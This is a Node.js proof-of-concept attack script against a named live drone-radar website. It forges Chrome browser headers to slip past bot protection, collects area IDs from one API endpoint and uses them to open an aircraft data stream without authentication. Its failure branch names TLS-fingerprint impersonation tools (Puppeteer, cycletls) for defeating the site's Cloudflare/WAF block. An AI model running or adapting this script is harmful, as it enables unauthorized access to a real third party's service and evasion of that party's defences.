const https = require('https');

// Configuration
const BASE_HOST = 'drooniradar.ee';
// Enhanced Headers to better mimic Chrome
const HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Referer': 'https://drooniradar.ee/',
    'Origin': 'https://drooniradar.ee',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"'
};

function makeRequest(path, headers = {}, isStream = false) {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: BASE_HOST,
            path: path,
            method: 'GET',
            headers: { ...HEADERS, ...headers }
        };

        const req = https.request(options, (res) => {
            console.log(`[${path}] Status: ${res.statusCode}`);
            if (res.statusCode === 403 || res.statusCode === 429) {
                console.log(`[${path}] Headers:`, JSON.stringify(res.headers, null, 2));
            }

            if (isStream) {
                res.on('data', (chunk) => {
                    console.log(`[${path}] DATA RECEIVED: ${chunk.toString().substring(0, 200)}...`);
                    req.destroy();
                    resolve(true);
                });
                return;
            }

            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                if (res.statusCode >= 200 && res.statusCode < 300) {
                    try {
                        resolve(JSON.parse(data));
                    } catch (e) {
                        resolve(data);
                    }
                } else {
                    reject(new Error(`Request failed with status ${res.statusCode}`));
                }
            });
        });

        req.on('error', (e) => reject(e));
        req.end();
    });
}

async function runPoC() {
    try {
        console.log("--- Step 1: Leaking Valid IDs from /areas (Enhanced Headers) ---");
        const areas = await makeRequest('/api/v1/areas');

        if (!Array.isArray(areas) || areas.length === 0) {
            throw new Error("Failed to fetch areas or no areas found.");
        }

        const validId = areas[0].id;
        console.log(`Found Valid Area ID: ${validId} (${areas[0].name})`);

        console.log("\n--- Step 2: Connecting to Stream ---");
        const streamHeaders = { 'Accept': 'text/event-stream' };
        await makeRequest(`/api/v1/aircraft_info?aid=${validId}`, streamHeaders, true);

        console.log("\n[SUCCESS] Unauthenticated access demonstrated.");

    } catch (error) {
        console.log("\n[PARTIAL FAILURE] WAF/Cloudflare Block Active.");
        console.log("Attack Vector Confirmed: The server is actively rejecting non-browser TLS fingerprints (JA3).");
        console.log("Bypass requires: Headless Processor (Puppeteer) or Specialized TLS Impersonation (cycletls).");
    }
}

runPoC();
